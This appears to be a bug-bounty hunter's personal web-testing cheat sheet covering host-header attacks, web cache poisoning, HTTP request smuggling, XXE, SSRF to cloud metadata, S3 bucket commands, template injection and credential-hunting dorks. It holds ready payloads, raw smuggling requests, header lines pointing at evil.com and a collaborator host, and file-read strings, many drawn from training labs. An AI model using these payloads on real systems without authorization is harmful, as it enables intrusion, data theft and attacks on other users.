================================================================================================
 
Some rate limiting bypass::::::

X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
=================================================================================================
https://bugbountyhunter.com/

https://danielmiessler.com/projects/webappsec_testing_resources/     Methodology For bugs


1  >>>>   No Rate Limiting  & Delete account without confirmation 


2  >>>>   Long Paaword Dos Attack   and Account lockout application dos


3  >>>>   Host header attack

        - Password reset poisoning from change the host to evil.com 


                - Password reset poisoning by X-Forwarde-Host to evil.com

                - Password reset poisoning through danglink markup and string port in host header '<a href="//xjk3h4uo18lryvi7yv3jaiwuoluji8.burpcollaborator.net/?


         >> Host header auth bypasss
                 
                 Some times website restrict their functionality to internal user only. . You can bypass this by making simple modification in 
                 Host header.
                 
                 Host: localhost
                 Host: 127.0.0.1
                 
                 
                 >> Routing based SSRF
                 
                 Put your burp coalborator domain in host header if request in burp then may be routing based SSRF
                 
                 You can brute force public ip( like 192.168.0.X) by intruder in burp pro
                 
                 
                >> SSRF ny flawd request parsing

        If you use host with your burp colob url then site is block your url But if you use absolute url then 
        bypass the parsing rule 

        GET https://your-lab-id.web-security-academy.net/
        Host: your-collaborator-id.burpcollaborator.net


                >> SSRF via malformed request line 

                 GET @private-intranet/example HTTP/1.1
                 

                 

        - If you access the webiste after change the host header then may be host header injection 

                - If error "Invalid host header" then may be CDN is there

                - Instead of receiving an "Invalid Host header" response, you might find that your request is blocked as a result
                  of some kind of security measure. For example, some websites will validate whether the Host header matches the
                  SNI from the TLS handshake. This doesn't necessarily mean that they're immune to Host header attacks.
                  
        - If you are also able to supply a non-numeric port, you can leave the domain name untouched to ensure that you 
                  reach the target application, while potentially injecting a payload via the port. 

        - You can try with subdomain of that site in host header 

                - Different systems and technologies will handle this case differently, but it is common for one of the two 
                  headers to be given precedence over the other one, effectively overriding its value. When systems disagree 
                  about which header is the correct one, this can lead to discrepancies that you may be able to exploit

        - The ambiguity caused by supplying both an absolute URL and a Host header can also lead to discrepancies between
          different systems. Officially, the request line should be given precedence when routing the request but, in 
                  practice, this isn't always the case. You can potentially exploit these discrepancies in much the same way as 
                  duplicate Host headers.
                  
                - You can also uncover quirky behavior by indenting HTTP headers with a space character. Some servers will 
                  interpret the indented header as a wrapped line and, therefore, treat it as part of the preceding header's v
                  alue. Other servers will ignore the indented header altogether.   
                  
                  GET /example HTTP/1.1
              Host: bad-stuff-here
          Host: vulnerable-website.com
                  
                  
                - You can sometimes use X-Forwarded-Host to inject your malicious input while circumventing any validation on 
                  the Host header itself.  
                  
                  Although X-Forwarded-Host is the de facto standard for this behavior, you may come across other headers that
                  serve a similar purpose, including: 
                   
                   - X-Host:
                   - X-Forwarded-Server:
                   - X-HTTP-Host-Override:
                   - Forwarded:
                   
                - You can use Burp Collaborator to help identify these vulnerabilities. If you supply the domain of your 
                  Collaborator server in the Host header, and subsequently receive a DNS lookup from the target server or 
                  another in-path system, this indicates that you may be able to route requests to arbitrary domains.  



        - 

                  
                  

4  >>>>   Oauth  Login CSRF

https://busk3r.medium.com/oauth-2-0-hacking-simplified-part-2-vulnerabilities-and-mitigation-d01dd6d5fa2c


5  >>>>   Oauth  account connect CSRF


6  >>>>   Oauth Url Redirect 


7  >>>>   Oauth Url Redirect account takeover


8  >>>>   



9  >>>>   Obscure Email vulnerabilty  if app register account as ran.veer2354@gmail.com gmail treated is as ranveer2354@gmail.com


10  >>>   Exposed Source Code control if find ---> .git, .gitignore , .bzr , .svn , .hg , CVS

          Use gittool in automation for large number of domains
                  

11  >>>   HTTPoxy attack if you find common cgi files on url or cgi like environment tools in burp


12  >>>   Server Side Includes if you find .shtml , .stm , shtm



13  >>>   Apache Struts if you find --> struts error, .action , .do , .java , .out , .bat , .seam , .sh , .bson , .pl , .pm


14  >>>   Exif Geolocation not stripped from uploaded image


15  >>>   Apache byte Range Application layer Dos if verion 2.2.x 


16  >>>   webmin unauthenticated rce in password_change.cgi on 10000 port


17  >>>   Untrusted source js exploitation


18  >>>   F5 Big_IP Rce if find --> /tmui

18.1 >>> JIRA  vulnerabilities-and-mitigation-d01dd6d5fa2c

        ---> Use Jira-Scan tool for SSRF vulnerabilty
                ---> rce in contact adminitrator.jsp file
                ---> Jira misconfig information discloser find on google

          
          Pre-Authorization Limited Arbitrary File Read in Jira Server - CVE-2020-29453
           
                  Limited Remote File Read in Jira Software Server - CVE-2021-26086 
                  
                  https://twitter.com/harshbothra_/status/1346109605756116995?lang=en
                  
                  https://github.com/ColdFusionX/CVE-2021-26086
                   
              https://github.com/sushantdhopat/JIRA_testing
        

                  For jira all cves here 
                  
                  https://jira.atlassian.com/browse/JRACLOUD-75473?jql=text%20~%20%22cve%22
                  
                  


19  >>>   HSTS on ssllabs test


20  >>>   Account Lockout for 24 hour in brute force then vulnerabilty


21  >>>   Test for blind xss 


22  >>>   Identity Testing::

           ---> You delete your account and your data still on application then vulnerabilty
                   ---> Try to signup as admin user 
                   ---> Try to signup with another user account
                   ---> 
                   
                   
23  >>>   Authentication Testting::
                  
                                  
                        -->     Authentication bypass via information disclosure
            If in response see own IP then may be possible this attack

                        https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass

         
                   ---> Always testing for default creds
                   ---> Vulnerable remember me fuctionality
                   ---> weak password reset functionality
                   ---> weak security question
                   
                   
24  >>>  Application server vulnerabilty ::
      
               ---> Testing default credentials if using open source or coomercial software
                   ---> Dangerous PUT http method allowed only if we put a file on server from this method 
                   ---> Application server trated as proxy and we can try CONNECT method to our server
                   ---> 
                   

25  >>>  Web cache deception 


25(1) >>> Web cache poisoning
         
      ::;::>>>>  Design flaws:::

                ---> Using web cache poisoning to deliver an XSS attack

                     X-Forwarded-Host: a."><script>alert(1)</script>"
                         
                ---> Using web cache poisoning to exploit unsafe handling of resource imports
          
                    X-Forwarded-Host: evil-user.net

        ---> Using web cache poisoning to exploit cookie-handling vulnerabilities.Cookies are often used to dynamically
                generate content in a response



           Place a suitable XSS payload in the fehost cookie, for example:
           fehost=someString"-alert(1)-"someString

        ---> Using multiple headers to exploit web cache poisoning vulnerabilities

                    X-Forwarded-Host: evil.com
                        X-Forwarded-Proto: nohttps


                ---> Exploiting responses that expose too much information. 
                     One such example is when responses contain information about how often the cache is purged or how old the
                         currently cached response is: 
                         
                HTTP/1.1 200 OK
                Via: 1.1 varnish-v4
                Age: 174
                Cache-Control: public, max-age=1800

        ---> Targeted web cache poisoning using an unknown header

                Find header from param miner extension 

                  X-Host: evil.com
                  
                ---> Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria 

                  - Use Param Miner to identify that the X-Forwarded-Host header is supported. 
                  - Add the header Access-Control-Allow-Origin: * to your evil site for cors 

          - payload on evil server 
             
                     {
                     "country": "<img src=1 onerror=alert(document.cookie) />"
                     }                   
                   
                   
                   
                   
                  >>>Implementation flaws>>
                  
                  
                  
                  
                ---> Web cache poisoning via an unkeyed port

        -If redirect was dynamically generated based on the Host header . This might enable you to construct a deniel of
         service by simply adding an arbitrary port to the request . All the users who browsed to the home page would 
         redirect to a dud port , taking down the home page  until the cache is expired .


        ---> Web cache poisoning via an unkeyed query string

        -       To identify a dynamic page, you would normally observe how changing a parameter value has an effect on the 
                response. But if the query string is unkeyed, most of the time you would still get a cache hit, and therefore 
                an unchanged response, regardless of any parameters you add. Clearly, this also makes classic cache-buster 
                query parameters redundant.

                - Fortunately, there are alternative ways of adding a cache buster, such as adding it to a keyed header that 
                doesn't interfere with the application's behavior. Some typical examples include: 

                Accept-Encoding: gzip, deflate, cachebuster
                Accept: */*, text/cachebuster
                Cookie: cachebuster=1
                Origin: https://cachebuster.vulnerable-website.com


                - Another approach is to see whether there are any discrepancies between how the cache and the back-end 
                normalize the path of the request. As the path is almost guaranteed to be keyed, you can sometimes exploit 
                this to issue requests with different keys that still hit the same endpoint. For example, the following 
                entries might all be cached separately but treated as equivalent to GET / on the back-end: 

                 Apache: GET //
         Nginx: GET /%2F
         PHP: GET /index.php/xyz
         .NET GET /(A(xyz)/ 

        We can use following apyload 

                GET /?evil='/><script>alert(1)</script>

        ---> Web cache poisoning via an unkeyed query parameter\

                -If we use any query parameter we notice that you get cache miss every time change in the query string
                This indicate the this is the part of cache key .Also notice that the query string is reflected in the responce


        -Go to param miner to find unkeyed parameter like utm_content
     
        - GET /?utm_content='/><script>alert(1)</script>

        - Once your payload is cached , remove the utm_content parameter , right-click on the request , and send request
         again to see your apyload is cached on home page

                 
                  
                ---> Web cache poisoning by parameter cloaking

        - If site cache excludes a certain parameter from the cache key. There is also inconsistent parameter parsing 
                between the cache and the cache and the backend server . 

                - We can find it by Param miner>>Guess params>>Guess everything

        - If site is using JSONP for the cross domain request ,this will contain a callback parameter 

        - Final payload is GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)


       ---> Exploiting a fat GET support 
           
            - If site accepts GET request that have body. but does not include the body in the cache key

        - GET /js/geolocate.js?callback=setCountryCookie
          …
          callback=alert(1)
                  
                  
           ---> URL normalization
             
                 - Browse to any non-existent path, such as GET /random. Notice that the path you requested is reflected 
                 in the error message
                 
                 - GET /random</p><script>alert(1)</script><p>foo
                 
                 
           ---> Cache key injection
           
             - 
                 
          ---> Internal cache poisoning
          
             - If the response reflects a mixture of both input from the last request you sent and input from previous request
                 ,this is a key indicator .
                 
                 - If input is reflected in resposes in multiple distinct page ,in particuler on pages in which you never tried inject 
                 your input .
                 
                 
                 
                 
                  

26  >>>  Ticket Trick bug hunting : Company uses Slack ,Yammer, fb for internal communication then

            ---> If there is tikcer issue ticket id creation for thread
                        ---> Through form or contact if application create your email for communication like support+ticketid@any.com
                        ---> If application uses slack then goto slack and register you as support+ticket@any.com 
                        ---> If succefull signup then you can listen internal chats



27  >>>  Evil way to account takeover:
    
                ---> Create Two same look like email 
                        ---> Compsoe email from one mail you will get ticket id for change your email
                        ---> Then go to chat system and contact if email change then vulnerability



28  >>>  Shellshock bash rce for --> file.cgi, cgi-bin


29  >>>  Nginx Range filter overflow 


30  >>>  Adobe coldfusion vulnerabilty --> .cfml , CFIDE  , 


31  >>>  Docker api Unauthenticated rce at port 2275, 2276


32  >>>  Xml external entity and xml tag injection

32(1) >> XInclude attacks :
     
       Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse 
           the document. An example of this occurs when client-submitted data is placed into a back-end SOAP request, which 
           is then processed by the backend SOAP service.

       In this situation, you cannot carry out a classic XXE attack, because you don't control the entire XML document 
           and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. XInclude 
           is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an 
           XInclude attack within any data value in an XML document, so the attack can be performed in situations where you 
           only control a single item of data that is placed into a server-side XML document.

       To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that 
           you wish to include. For example:
           
           
           
      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/></foo>
          
          
          
          
          XXE with file upload 
          
          Create a local SVG image with the following content:
          
          <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
          
         


33  >>>  Sql injection


34  >>>  Double order sql injection


35  >>>  Postgresql rce On port 5432 need tool pgadmin try with default creds


36  >>>  PHPmyadmin authenticated rce on php<5.4


37  >>>  MySql authentication bypass 



38  >>>  DnsZone transfer vulnerabilty

         dig @8.8.8.8 victim.com
                 dig @ns1.server axfr victim.com
                 


39  >>> HTTP request smugling 
     
         https://www.youtube.com/watch?v=XC48irGjKNc
         https://portswigger.net/web-security/request-smuggling

     HTTP Request Smuggling (HRS) is a web application vulnerability that enables an attacker to craft a single request 
         that hides a second request within the body of the first request.
         
         CL= Content-Length
         TE= Transfer-Encoding
         
         
     ==>if an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the 
         following will often cause a time delay: 
         
         POST / HTTP/1.1
     Host: vulnerable-website.com
     Transfer-Encoding: chunked
     Content-Length: 4

     1
     A
     X
         
     -------------------------------------------------------------------------
         
         ==>>If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following
         will often cause a time delay: 
         
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 6

    0

    X

        -------------------------------------------

        ==> Confirming CL.TE vulerabilities using differential responses
        To confirm a CL.TE vulnerability, you would send an attack request like this: 

        POST /search HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 49
    Transfer-Encoding: chunked

    e
    q=smuggling&x=                            
    0

    GET /404 HTTP/1.1
    Foo: x
        ----------------------------------------------------------------
        To confirm a TE.CL vulnerability by differential response, you would send an attack request like this: 

        POST /search HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4
    Transfer-Encoding: chunked

    7c
    GET /404 HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0
        -------------------------------------------------------------

        ==>TE.TE Behavior: ofuscating the TE header 

        Here both the servers support TE header but , one of the server can be induced not to process it by obfuscating
        the header in some way.

        Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated 
        Transfer-Encoding header, the remainder of the attack will take the same form as for the CL.TE or TE.CL 
        vulnerabilities already described. 

        Some ways of obfuscate Transfer-Encoding:

        Transfer-Encoding: xchunked

    Transfer-Encoding : chunked

    Transfer-Encoding: chunked
    Transfer-Encoding: x

    Transfer-Encoding:[tab]chunked

    [space]Transfer-Encoding: chunked

    X: X[\n]Transfer-Encoding: chunked

    Transfer-Encoding
    : chunked


        Note:: After time delay technique if site is vulernable then you can use 

        Host: vulerabl-site
        X-Forwarded-For: burp-colab.net 

        If you get dns lookup in burp then site is vulerable


        If found TE.CL then for exploit you should use size of cunke before the second request







39(1) >>> Exploiting    HTTP request smugling

         >>>Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
                 
                 There's an admin panel at /admin, but the front-end server blocks access to it.  we can access it by HTTP smugle
                 
                 Issue the following request twice:
                 
         POST / HTTP/1.1
         Host: your-lab-id.web-security-academy.net
         Content-Type: application/x-www-form-urlencoded
         Content-Length: 54
         Transfer-Encoding: chunked

         0

         GET /admin HTTP/1.1
         Host: localhost
         X-Ignore: X
                 
            >>>Exploiting HTTP request smuggling to reveal front-end request rewriting

                perform the following steps: 

                -Find the POST request that reflects the value of a request parameter into application's response 
                -Shuffle the parameterso that the reflected parameter appears in the message body 
                -Smuggle this reques to the back-end server 
                POST / HTTP/1.1

        Host: acf61f3a1e270e0ec08a1f0200900069.web-security-academy.net
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 124
        Transfer-Encoding: chunked

        0



        POST / HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 200
        Connection: close

        search=test

                >>>Exploiting HTTP request smuggling to perform web cache poisoning
                If any part of the front-end infrastructure performs caching of content, then it might be possible to poison 
                the cache with the off-site redirect response. This will make the attack persistent, affecting any user who 
                subsequently requests the affected URL. 

                POST / HTTP/1.1
        Host: ac501fa01f560f6ac0eaf2a400a700b1.web-security-academy.net
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 198
        Transfer-Encoding: chunked

        0

        GET /post/next?postId=3 HTTP/1.1
        Host: exploit-acee1f881f3e0f52c02cf23201410086.web-security-academy.net
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 10

        x=1



                >>








40  >>>  Insecure CORS


41  >>>  URL Redirection 


42  >>>  Parameter Tampering


43  >>>  CSRF vulnerability   & Check for IDOR vulnerability


44  >>>  SSRF vulnerability:: if found parameter like ; uri=, url= , file= , 

           ---> SSRF to RFI to Shell
                   ---> SSRF to LFI use file:///,  dict:///,  sftp:/// , ldap ;/// , ldaps:/// , ldapi:/// , tftp:///
                   ---> SSRF to internal port scan
                   ---> SSRF if any application converting file type  pdf to image or html
                   ---> SSRF to retrive cloud metadata if application using cloud 
                        --> for amazone   http://169.254.169.254/latest/metadata
                            --> for Google    http://metadata.google.internal/computeMetadata/v1
                            --> Azure         http://169.254.169.254/metadata
                          
444  >>  AWS pentesting


          ---> aws set to list for everyone
                     aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
                         
                         
          ---> aws list for any aws user 
                     aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
                         
                         
                  ---> Download this whole S3 bucket using
             aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
             
                  --->  Delete Bucket
                         aws s3 rb s3://my-awesome-new-bucket --force
                  
                  --->  Download S3 Object to Local               
                     aws s3 cp s3://my-awesome-new-bucket .
             download: ./backup.tar from s3://my-awesome-new-bucket/backup.tar
                         
                  --->   Upload Local File as S3 Object
                      
                         aws s3 cp backup.tar s3://my-awesome-new-bucket
             upload: ./backup.tar to s3://my-awesome-new-bucket/backup.tar
                         
                  --->   Delete S3 Object                 
                     aws s3 rm s3://my-awesome-new-bucket/secret-file.gz
             delete: s3://my-awesome-new-bucket/secret-file.gz
                         
                         
                         
                          
45  >>>  SOAP if we found ?wsdl file then we can use SOAP UI tool in windows


46  >>>  XPATH injection check for single and double quote and find always true statement and always false statement


47  >>>  Serialization vulnerability::
   
        ---> java serialization
                ---> Php serialization
                ---> .Net serialization


48  >>>  Template Injection 
            

            ---> {{7*7}}
                ---> ${7*7}
                ---> %{7*7}
                ---> #{7*7}
                ---> %25{7*7}
                ---> {7*7}
                ---> ${{48*53}}`'";--><sCRIpt sRc=//your.oob></sCRIpt>


49  >>>  XSLT it is like xml document 
       
            --->XSLT to file read
                ---> XSLt to rce


50  >>>  Padding Oracle attack 


51  >>>  Hash Lenght Extension attack


53 >>>Prototype pollution

Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.
An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.




https://www.youtube.com/watch?v=Gv1nK6Wj8qM                nahamsec video for prototype

https://www.youtube.com/watch?v=J3MIOIqvV8w                 good video for revison
https://www.youtube.com/watch?v=yDmOXhr8wmw

  >> a={}
Object {  }
>> b={}
Object {  }
>> b.__proto__.foo='bar';
"bar"
>> b.foo
"bar"
>> c={}
Object {  }
>> c.foo
"bar"
>> a.foo
"bar"




52  >>>  Git hub sensetive data exposes 

   Use truflehog tool 
   

    Go to site >>> https://github.com/random-robbie/keywords/blob/master/keywords.txt 

        1---> "company" security_credentials          Ldap 
                2---> "company" connectionstring              Database creds
                3---> "company" JDBC                          database creds
                4---> "company" ssh2_auth_password             Authbyapss
                5---> "company" send_keys or send, keys       other keywords
                6---> "company" langauge:python keys 
                7---> "fasken.com" pasword NOT iaa.hasken.com
        8---> org:fasken pasword
                9---> user:ranveer paswd
            10--> 






54.>>>>> Google Dorking===========================++++++++++++++++++++++++++++
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.>>



site:help.financialforce.com ext:htm        Shows the extension in html from gooogle

 "            "     "        ext:xlsx
 
 "                      "    ext:pdf intitle:Setup
 
 "                    "      ext:php intitle:Setup
 
 ""                      "   ext:jsp
 
 
 
 
site:.nab.com.au intitle:"

site:.financialforce.com inurl:img_url                       Shows url for ssrf

site:.financialforce.com inurl:*/admin/*                     Shows the admin pages

site:.financialforce.com inurl:*/api?*

                    





55..>>>>>>>>> Reverse Proxies


1. Path parameters in java based servers
  
  > Similar to query strings (?a=1&b=2) but delimmited by ";"
  > Example: "/index.jsp;x=1;y=2" Consist of path parameter x and y
  > Having extraneous ";" also wonot affect loading the file
  > Example: "/index.jsp;" would return "/index.jsp" content
  

2. Path parameters in Tomacat
 
 >> Tomacat parses the path in the following manner
 
  > Remove path parameters -begining from ";" until position of "/"
    Example:
           "/xyz;test=1/index.jsp" would become "/xyz/index.jsp"
           "/xyz;/index.jsp" would become "/xyz/index.jsp"
  > Url decode the path
  >Normalise the path ( basically resolve /../ or multiple /// etc.)

  
3. Nginx as a Reverse Proxy

  Example Rule1.
  
  > nginx.conf:
  server{
  
  location /app1{
       proxy_pass http://internal.app;
           }
   }
   
   Any HTTP request to Nginx server with path /app1<anything here> would be proxied to http://interanl
   .app/<anthing here>
   
   Example Rule2.
   
   nginx.conf;
   server {
   
   location ~ ^/app2/(.*\.jpg)${                     #Matches any fileending with .jpg in /app2/ directory
        proxy_pass http://internal.app/app2/$1;
                }
        }

        Any HTTP request to nginx server with path /app2/<anything>.jpg would be proxied to
        http://interanl.app/app2/<anything>.jpg 





>>>>>Processing done by nginx :

  > Url decode once & normalize the path eg. /../ , %2f..%2f etc (/.. is not normalize) before 
  matching the location rule
  
  >Ignore "#" URI fragment part
  
  >doesnot allow %2f as the first slash and ////(multiple slash) become /
  
  >if root trailing '/' is missing in proxy_pass argument, unprocessed raw path is send as a is





=======>>>>>>First senorio where nginx is reverse proxy and tomcat is backend server

   
        >>suppose there exists an unauth internal API/path/file or say Tomcat manager is with default creds

        >>Remember the http://internal.app:8080 services is not exposed externally

        >>http://site.com/app/../ would be processed ny nginx to '/' and look for the rule '/' instead of "/app"

        >>Therefore , /../ of %2f..%2f or similar variation won't work

        ==>> Exploit for this is http://site.com/app/..;/secretapi/users
                                 http://site.com/app../secretapi/users
                                     http://site.com/static../setting.py       # we can load file witch have creds
                                                         http://site.com/protcted//../
 
                                   
                                                   
https://www.example.com..;/api/v1/users
https://www.example.com/api..;/v1/users
https://www.example.com/api/v1..;/users
https://www.example.com/..;api/v1/users
https://www.example.com/api/..;v1/users
https://www.example.com/api/v1/..;users
https://www.example.com/api/v1/users/..;
https://www.example.com/api/v1/users/..;/                                                        
                                                         
                                                         
                                                         
                                                         
                                                         
=======>>>>>>>>>>Apache as a reverse proxy

                Processing done by apache :
        
       >Url decodes once & mormalize the path before matching location rule
           
       >////(multiple slash) becomes / if it is in the begining eg ///path=> /path
            
           >afterwards , /path//path2 apache treats // as an individual directory with blank name 
           
           > send processd request
           
           
           >Exploit: Any request to apache server with path /img/@evil.com/ or /img/.evil.com/
           would now allow make a arbitrary server side request to evil.com via proxy .
           
           
           
           
